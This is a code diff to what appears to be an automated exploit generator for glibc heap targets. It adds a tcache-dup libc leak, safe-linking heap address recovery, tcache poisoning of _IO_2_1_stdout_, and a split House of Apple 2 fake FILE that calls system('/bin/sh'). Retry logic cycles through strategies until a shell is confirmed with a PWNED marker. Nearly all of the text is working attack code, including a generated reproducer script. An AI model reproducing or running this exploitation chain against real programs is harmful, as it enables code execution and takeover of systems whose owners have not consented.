@@ -1857,6 +1857,7 @@ def render_heap_script(*, menu_ops, unsorted_off, stdout_off, wfile_jumps_off, s
         f"WFILE_JUMPS_OFF={wfile_jumps_off:#x}; SYSTEM_OFF={system_off:#x}\n"
         f"POISON={poison_size:#x}; GUARD={guard_size:#x}\n"
         f"STRATEGY={strategy!r}; FILL={fill_size:#x}; FILLSLOTS={int(fill_slots or fill_max)}\n"
+        f"SPLIT={poison_size < 0x2A8!r}   # the one-piece fake FILE needs 0x2A8 bytes\n"
         "SIZES={}\n"
         "def render(t, idx=None, size=None, data=b'', dsize=None):\n"
         "    def sub(s):\n"
@@ -1892,6 +1893,16 @@ def render_heap_script(*, menu_ops, unsorted_off, stdout_off, wfile_jumps_off, s
         "        elif p.poll() is not None: break\n"
         "        elif out and (time.time()-last)>quiet: break\n"
         "    return out\n"
+        "def hoa2_split(stdout_addr, wide_addr, wfile_jumps, system, command=b' /bin/sh'):\n"
+        "    # the fake _IO_wide_data (+0) and its jump table (+0x18) live in OUR chunk, so the write\n"
+        "    # at stdout is only the 0xE0-byte FILE: no single write needs 0x2A8 bytes\n"
+        "    wide=bytearray(b'\\x00'*0xE8); hdr=bytearray(b'\\x00'*0xE0)\n"
+        "    def w(b,o,v): b[o:o+8]=struct.pack('<Q', v & 0xFFFFFFFFFFFFFFFF)\n"
+        "    w(wide,0x30,0); w(wide,0x18+0x68,system); w(wide,0xE0,wide_addr+0x18)\n"
+        "    hdr[0:len(command)]=command\n"
+        "    w(hdr,0x20,0); w(hdr,0x28,1); w(hdr,0x38,0)\n"
+        "    w(hdr,0x88,wide_addr+0xA0); w(hdr,0xA0,wide_addr); w(hdr,0xD8,wfile_jumps)\n"
+        "    return bytes(hdr), bytes(wide)\n"
         "def hoa2(write_addr, wfile_jumps, system, command=b' /bin/sh'):\n"
         "    b=bytearray(b'\\x00'*0x300)\n"
         "    def w(o,v): b[o:o+8]=struct.pack('<Q', v & 0xFFFFFFFFFFFFFFFF)\n"
@@ -1926,6 +1937,16 @@ def render_heap_script(*, menu_ops, unsorted_off, stdout_off, wfile_jumps_off, s
         "            b=binhead(v)\n"
         "            if b: base,off=b,o; break\n"
         "        if base: break\n"
+        "elif STRATEGY=='tcache-dup':   # few slots: re-enter ONE chunk, clearing the tcache key\n"
+        "    PB=0\n"
+        "    op(ADD(0,FILL,b'A')); op(ADD(1,FILL,b'G'))   # victim + a guard off the top chunk\n"
+        "    for _ in range(24):\n"
+        "        op(FREE(0)); vo=op(VIEW(0),0.45)\n"
+        "        for o,v in windows(vo):\n"
+        "            b=binhead(v)\n"
+        "            if b: base,off=b,o; break\n"
+        "        if base: break\n"
+        "        op(EDIT(0,b'\\x00'*16))   # clear fd+key so the next free re-enters the bin\n"
         "else:                         # one above-tcache chunk links into a bin head immediately\n"
         "    op(ADD(0,GUARD,b'A')); op(ADD(1,GUARD,b'B')); op(FREE(0))\n"
         "    vo=op(VIEW(0),0.5)\n"
@@ -1934,17 +1955,29 @@ def render_heap_script(*, menu_ops, unsorted_off, stdout_off, wfile_jumps_off, s
         "        if b: base,off=b,o; break\n"
         "assert base, 'libc leak failed'\n"
         "stdout_addr=base+STDOUT_OFF\n"
+        "def page_of(o):   # chunk>>12 from a LONE tcache entry, at the calibrated offset\n"
+        "    if len(o)>=off+8:\n"
+        "        c=struct.unpack('<Q',o[off:off+8])[0]\n"
+        "        if 0<c<(1<<40): return c\n"
+        "    return next((v for _,v in windows(o) if 0<v<(1<<40)),0)\n"
+        "payload=None\n"
+        "if SPLIT:   # the size cap cannot hold the one-piece FILE: park the fake _IO_wide_data and\n"
+        "    op(ADD(PB,POISON,b'C')); op(ADD(PB+1,POISON,b'D'))   # its jump table in our OWN chunk\n"
+        "    op(FREE(PB)); heap=page_of(op(VIEW(PB),0.5))\n"
+        "    assert heap, 'heap page failed'\n"
+        "    op(FREE(PB+1)); fo=op(VIEW(PB+1),0.5)\n"
+        "    fd2=struct.unpack('<Q',fo[off:off+8])[0] if len(fo)>=off+8 else 0\n"
+        "    wide_addr=fd2 ^ heap   # two entries: head fd == (head>>12)^next, so next falls out\n"
+        "    assert 0x550000000000<=wide_addr<0x600000000000, 'bad full heap addr %#x'%wide_addr\n"
+        "    payload, wide = hoa2_split(stdout_addr, wide_addr, base+WFILE_JUMPS_OFF, base+SYSTEM_OFF)\n"
+        "    op(ADD(PB+2,POISON,b'E')); op(ADD(PB+3,POISON,wide[:POISON]))\n"
         "op(ADD(PB,POISON,b'C')); op(ADD(PB+1,POISON,b'D')); op(FREE(PB))\n"
-        "ho=op(VIEW(PB),0.5); heap=0\n"
-        "if len(ho)>=off+8:   # the safe-linked fd sits at the same offset as the libc fd did\n"
-        "    c=struct.unpack('<Q',ho[off:off+8])[0]\n"
-        "    if 0<c<(1<<40): heap=c\n"
-        "if not heap: heap=next((v for _,v in windows(ho) if 0<v<(1<<40)),0)\n"
+        "heap=page_of(op(VIEW(PB),0.5))\n"
         "assert heap, 'heap leak failed'\n"
         "op(ADD(PB,POISON,b'C')); op(FREE(PB+1)); op(FREE(PB))\n"
         "op(EDIT(PB, struct.pack('<Q', heap ^ stdout_addr)+b'\\x00'*8)); op(ADD(PB+2,POISON,b'E'))\n"
-        "blob=hoa2(stdout_addr, base+WFILE_JUMPS_OFF, base+SYSTEM_OFF)\n"
-        "op(ADD(PB+3,POISON,blob[:POISON]))\n"
+        "if payload is None: payload=hoa2(stdout_addr, base+WFILE_JUMPS_OFF, base+SYSTEM_OFF)\n"
+        "op(ADD(PB+3,POISON,payload[:POISON]))\n"
         "p.stdin.write(EXIT); p.stdin.flush(); time.sleep(0.3)\n"
         "p.stdin.write(b'id; echo PWNED-LYKOS\\n'); p.stdin.flush()\n"
         "out=read_until(p, time.time()+8, quiet=1.5)\n"
@@ -1954,9 +1987,15 @@ def render_heap_script(*, menu_ops, unsorted_off, stdout_off, wfile_jumps_off, s
     ).encode()
 
 
+# Leak size used when the fake FILE has to be split across two writes: it must differ from the
+# poison size (whose tcache bin must stay empty) yet still exceed the fastbin ceiling, since a
+# fastbin fd discloses a heap pointer rather than a main_arena bin head.
+_SPLIT_LEAK_SIZE = 0x90
+
+
 # --- automated glibc-heap -> shell: tcache poison _IO_2_1_stdout_ + House of Apple 2 (gap #4) ----
 def _heap_fsop_attempt(exe, workdir, *, add, free, view, edit, exit_seq, libc_data, unsorted_off,
-                       poison_size=0x300, guard_size=0x430, fill_size=0x100, use_fill=False,
+                       poison_size=0x300, guard_size=0x430, fill_size=0x100, leak_mode="large",
                        fill_slots=None, marker=b"LYKOS-HEAP-9931",
                        timeout=10.0, base_argv=(), mem_mb=2048) -> dict:
     """Drive a menu-style glibc-heap target to a shell, fully automatically, via tcache poisoning +
@@ -2079,52 +2118,120 @@ def _heap_fsop_attempt(exe, workdir, *, add, free, view, edit, exit_seq, libc_da
                     return b, off, n
         return None, 0, n
 
+    def _leak_libc_dup(fill_size, max_dup=24):
+        """Few-slot notebook: the fill above needs capacity+1 DISTINCT chunks held at once, which a
+        small slot table cannot do. Re-enter the SAME chunk instead. tcache_put stamps a key into the
+        chunk and _int_free only scans the bin for a duplicate when that key is still intact, so
+        clearing it through the UAF write -- the very edit the poison already needs -- lets the chunk
+        be freed into the bin again and again. Once the bin is full the next free links it into a
+        main_arena bin head, exactly as the fill's spill does.
+
+        Needs only TWO slots: the victim, and a guard so the victim never borders the top chunk
+        (which would consolidate into it instead of linking)."""
+        _op(add(0, fill_size, b"A"))
+        _op(add(1, fill_size, b"G"))
+        for _ in range(max_dup):
+            _op(free(0))
+            vout = _op(view(0), 0.45)
+            for off, v in _windows(vout):
+                b = _bin_head_base(v)
+                if b:
+                    return b, off, 2
+            _op(edit(0, b"\x00" * 16))               # clear fd+key so the next free re-enters tcache
+        return None, 0, 2
+
     try:
         _read_until(p, time.time() + 0.5)
         # 1) libc leak. The matching window's OFFSET is where this view's raw chunk bytes begin past
         #    any prompt (a prompt-straddling window cannot pass the page-alignment guard), which the
         #    heap leak below reuses as calibration.
-        base, data_off, used = (_leak_libc_fill(fill_size) if use_fill else _leak_libc_large())
+        base, data_off, used = ({"fill": _leak_libc_fill, "dup": _leak_libc_dup}
+                                .get(leak_mode, lambda _s: _leak_libc_large())(fill_size))
         if not base:
-            return {"ok": False, "slots": used,
-                    "reason": (f"libc leak failed (tcache-fill at {fill_size:#x} over {used} usable "
-                               "slots disclosed no bin head; the bin needs capacity+1 distinct "
-                               "chunks, so a smaller table cannot spill)" if use_fill else
-                               f"libc leak failed (no bin head from a {guard_size:#x} chunk -- a "
-                               "size cap would refuse it)")}
-        # Poison slots. The large path allocated indices 0-1, so start past them. The fill path left
-        # indices 0.. holding FREED chunks of fill_size, whose slots are free to overwrite: the poison
-        # runs in a DIFFERENT size class, so its own tcache bin is still empty (what step 2 needs).
-        pb = 0 if use_fill else 2
+            why = {"fill": (f"tcache-fill at {fill_size:#x} over {used} usable slots disclosed no "
+                            "bin head; the bin needs capacity+1 distinct chunks, so a smaller table "
+                            "cannot spill"),
+                   "dup": (f"re-entering one {fill_size:#x} chunk disclosed no bin head; the tcache "
+                           "key-clear through edit did not take, so the bin never overflowed")
+                   }.get(leak_mode, f"no bin head from a {guard_size:#x} chunk -- a size cap would "
+                                    "refuse it")
+            return {"ok": False, "slots": used, "reason": f"libc leak failed ({why})"}
+        # Poison slots. The large path allocated indices 0-1, so start past them. The fill and dup
+        # paths leave low slots holding FREED chunks whose slot entries are free to overwrite: the
+        # poison runs in a DIFFERENT size class, so its own tcache bin is still empty (what step 2
+        # needs), and reusing those slots keeps the whole chain inside a small table.
+        pb = 2 if leak_mode == "large" else 0
         stdout_addr = base + T["stdout"]
         # 2) heap leak via a freed tcache chunk's safe-linked fd == chunk2>>12. The fd sits at the
         #    SAME offset in this view's output as the libc fd did (same view op, same prompts), so read
         #    it there rather than guessing where a prompt ends -- a non-PIE heap page is tiny (~0x405)
         #    and indistinguishable by value from a misaligned prompt-straddling window. Fall back to a
         #    scan only when the calibrated word is implausible (prompt timing shifted the output).
+        def _page_of(out):
+            """chunk>>12 from a LONE tcache entry's fd. Prefer the offset the libc leak calibrated
+            (same view op, same prompts); a non-PIE heap page is tiny and otherwise indistinguishable
+            from a misaligned prompt-straddling window."""
+            if len(out) >= data_off + 8:
+                c = _struct.unpack("<Q", out[data_off:data_off + 8])[0]
+                if 0 < c < (1 << 40):
+                    return c
+            return next((v for _, v in _windows(out) if 0 < v < (1 << 40)), 0)
+
+        split = poison_size < _heap.HOA2_BLOB_MIN
+        wide_addr = 0
+        if split:
+            # The cap cannot hold the one-piece fake FILE, so the fake _IO_wide_data and its jump
+            # table go in a chunk of OUR own -- which means we need that chunk's FULL address, not
+            # just its page. Two entries in a bin give it up: the head's fd is
+            # (head>>12) ^ next, and head>>12 is what a LONE entry disclosed, so next falls out.
+            _op(add(pb, poison_size, b"C"))
+            _op(add(pb + 1, poison_size, b"D"))
+            _op(free(pb))
+            heap_page = _page_of(_op(view(pb), 0.5))
+            if not heap_page:
+                return {"ok": False, "reason": "heap leak failed (split)", "libc_base": base}
+            _op(free(pb + 1))
+            fout = _op(view(pb + 1), 0.5)
+            fd2 = (_struct.unpack("<Q", fout[data_off:data_off + 8])[0]
+                   if len(fout) >= data_off + 8 else 0)
+            wide_addr = fd2 ^ heap_page                  # the full address of the first-freed chunk
+            if not (0x550000000000 <= wide_addr < 0x600000000000):
+                return {"ok": False, "libc_base": base,
+                        "reason": f"full heap address implausible ({wide_addr:#x})"}
+            hdr, wide = _heap.build_house_of_apple2_split(
+                stdout_addr, wide_addr, wfile_jumps=base + T["wfile_jumps"],
+                system=base + T["system"])
+            # The bin holds [second-freed -> first-freed], so the SECOND allocation lands on
+            # wide_addr; park the fake structures there and leave the bin empty again.
+            _op(add(pb + 2, poison_size, b"E"))
+            _op(add(pb + 3, poison_size, wide[:poison_size]))
+            payload = hdr
+        else:
+            payload = None                               # built below, once heap_page is known
+
+        # 2) heap leak + 3) poison: with two freed tcache chunks, mangle the head's fd so the second
+        #    allocation after it is handed back AT _IO_2_1_stdout_.
         _op(add(pb, poison_size, b"C"))
         _op(add(pb + 1, poison_size, b"D"))
         _op(free(pb))
         hout = _op(view(pb), 0.5)
-        heap_page = 0
-        if len(hout) >= data_off + 8:
-            cand = _struct.unpack("<Q", hout[data_off:data_off + 8])[0]
-            if 0 < cand < (1 << 40):
-                heap_page = cand
+        heap_page = _page_of(hout)
         if not heap_page:
-            heap_page = next((v for _, v in _windows(hout) if 0 < v < (1 << 40)), 0)
-        if not heap_page:
-            return {"ok": False, "reason": f"heap leak failed (dump {hout[:32].hex()})"}
+            # Report the recovered base even though this failed: it is what tells the caller the
+            # LEAK stage worked and only the poison did not, which is the cue to retry with a
+            # cap-sized poison chunk (and hence the split fake FILE).
+            return {"ok": False, "libc_base": base,
+                    "reason": f"heap leak failed (dump {hout[:32].hex()})"}
         _op(add(pb, poison_size, b"C"))              # take the chunk back; tcache empty for this size
-        # 3) poison: free two, mangle the head's fd to _IO_2_1_stdout_
         _op(free(pb + 1))
         _op(free(pb))
         _op(edit(pb, _struct.pack("<Q", heap_page ^ stdout_addr) + b"\x00" * 8))
         _op(add(pb + 2, poison_size, b"E"))          # returns the poisoned chunk
-        # 4) the next allocation lands on _IO_2_1_stdout_; write the House of Apple 2 FILE there
-        blob = _heap.build_house_of_apple2(stdout_addr, wfile_jumps=base + T["wfile_jumps"],
-                                           system=base + T["system"])
-        _op(add(pb + 3, poison_size, blob[:poison_size]))
+        # 4) the next allocation lands on _IO_2_1_stdout_; write the fake FILE there
+        if payload is None:
+            payload = _heap.build_house_of_apple2(stdout_addr, wfile_jumps=base + T["wfile_jumps"],
+                                                  system=base + T["system"])
+        _op(add(pb + 3, poison_size, payload[:poison_size]))
         # trigger the flush -> FSOP -> shell, then confirm
         try:
             p.stdin.write(exit_seq)
@@ -2141,8 +2248,11 @@ def _heap_fsop_attempt(exe, workdir, *, add, free, view, edit, exit_seq, libc_da
         out = _read_until(p, time.time() + timeout, quiet=1.5)
         if marker in out:
             return {"ok": True, "libc_base": base, "heap_page": heap_page, "slots": used,
-                    "stdout": stdout_addr, "fill_size": fill_size if use_fill else None,
-                    "strategy": "tcache-fill" if use_fill else "large-chunk",
+                    "stdout": stdout_addr, "poison_size": poison_size,
+                    "wide_addr": wide_addr or None,
+                    "fill_size": None if leak_mode == "large" else fill_size,
+                    "strategy": {"fill": "tcache-fill", "dup": "tcache-dup"}.get(leak_mode,
+                                                                                 "large-chunk"),
                     "output": out[:400].decode("latin-1", "ignore")}
         return {"ok": False, "reason": "no shell confirmed", "libc_base": base,
                 "output": out[:200].decode("latin-1", "ignore")}
@@ -2175,23 +2285,61 @@ def heap_fsop_exploit(exe, workdir, *, add, free, view, edit, exit_seq, libc_dat
     desyncs the menu (the stray byte is read as the next option) and usually exits the target, so the
     second strategy cannot share the first one's process. Returns {ok, libc_base, heap_page,
     strategy, fill_size, ...}; `strategy`/`fill_size` tell the caller what to put in the reproducer."""
+    from . import heap as _heap                         # this wrapper is NOT inside _heap_fsop_attempt
     kw = dict(add=add, free=free, view=view, edit=edit, exit_seq=exit_seq, libc_data=libc_data,
               unsorted_off=unsorted_off, poison_size=poison_size, guard_size=guard_size,
               fill_size=fill_size, marker=marker, timeout=timeout, base_argv=base_argv,
               mem_mb=mem_mb)
-    res = _heap_fsop_attempt(exe, workdir, use_fill=False, **kw)
+
+    def _try(mode, **over):
+        """One attempt, plus a SPLIT-payload retry when the leak worked but the FSOP stage did not.
+        That pattern means the size cap refused the one-piece fake FILE (which needs 0x2A8 bytes),
+        so retry at a size the notebook has already proven it accepts -- the leak's own fill_size --
+        which puts the fake _IO_wide_data in our own chunk instead of inside the stdout write."""
+        r = _heap_fsop_attempt(exe, workdir, leak_mode=mode, **{**kw, **over})
+        tried = int(over.get("poison_size", kw["poison_size"]))
+        # The SMALLEST chunk that still holds both split writes (the 0xE0 FILE header and the 0xE8
+        # wide blob). Going smaller than the cap allows costs nothing and covers every cap down to
+        # this floor; picking something larger just to match the leak size would refuse a tight cap.
+        small = _heap.HOA2_SPLIT_MIN
+        if (not r.get("ok") and r.get("libc_base")
+                and tried >= _heap.HOA2_BLOB_MIN > small):
+            # Leak at a SMALLER size than the poison. A fill or dup leaves its own size's tcache bin
+            # full (dup leaves it full of one repeated chunk), and the poison needs a bin it can put
+            # exactly one chunk into -- so the two must not share a size class. 0x90 keeps the leak
+            # chunk above the fastbin ceiling, which a bin-head leak requires.
+            r2 = _heap_fsop_attempt(exe, workdir, leak_mode=mode,
+                                    **{**kw, **over, "poison_size": small,
+                                       "fill_size": _SPLIT_LEAK_SIZE})
+            if r2.get("ok"):
+                return r2
+        return r
+
+    res = _try("large")
     if res.get("ok") or "libc leak failed" not in str(res.get("reason", "")):
         return res
-    res2 = _heap_fsop_attempt(exe, workdir, use_fill=True, **kw)
+    res2 = _try("fill")
     # Probing for the end of a SMALL slot table costs that process (the refused add desyncs the menu
     # and exits the target), so if the fill discovered a table shorter than it probed, replay it with
-    # the count now known -- that run allocates only real slots and keeps its process alive.
+    # the count now known -- that run allocates only real slots and keeps its process alive. Below 8
+    # slots no glibc's tcache can be filled by distinct chunks at all, so don't spend a replay on it.
     slots = res2.get("slots") or 0
-    if not res2.get("ok") and 3 <= slots < 20:
-        res3 = _heap_fsop_attempt(exe, workdir, use_fill=True, fill_slots=slots, **kw)
-        if res3.get("ok"):
-            return res3
-        res2 = res3
-    if not res2.get("ok"):
-        res2["reason"] = f"{res.get('reason')}; then {res2.get('reason')}"
-    return res2
+    if not res2.get("ok") and 8 <= slots < 20:
+        res2 = _try("fill", fill_slots=slots)
+    if res2.get("ok"):
+        return res2
+    # Still nothing: the table is too small to hold capacity+1 distinct chunks. Re-enter ONE chunk
+    # instead, which needs only a victim and a guard.
+    res3 = _try("dup")
+    if res3.get("ok"):
+        return res3
+    # A TIGHT cap refuses even the default leak chunk, so the leak itself never gets far enough to
+    # ask for a smaller poison. Retry the re-entry leak at a size any cap above the fastbin ceiling
+    # accepts; its own split retry then sizes the poison down too.
+    if int(kw["fill_size"]) != _SPLIT_LEAK_SIZE:
+        res4 = _try("dup", fill_size=_SPLIT_LEAK_SIZE)
+        if res4.get("ok"):
+            return res4
+        res3 = res4
+    res3["reason"] = (f"{res.get('reason')}; then {res2.get('reason')}; then {res3.get('reason')}")
+    return res3
